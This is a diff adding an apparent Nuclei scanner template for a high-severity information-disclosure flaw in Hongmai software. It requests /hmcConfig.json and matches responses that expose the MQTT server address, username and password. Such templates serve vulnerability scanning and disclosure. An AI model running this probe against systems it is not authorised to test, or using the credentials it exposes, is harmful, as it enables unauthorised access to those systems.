@@ -1,0 +1,31 @@
+id: hongmai-hmcConfig-info
+
+info:
+  name: 宏脉信息技术 hmcConfig 存在信息泄露漏洞
+  author: hongmai
+  severity: high
+  tags: hongmai
+
+http:
+  - raw:
+      - |+
+        GET /hmcConfig.json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Pragma: no-cache
+        Cache-Control: no-cache
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'MQTT_IP'
+          - 'MQTT_USERNAME'
+          - 'MQTT_PASSWORD'
+        condition: and
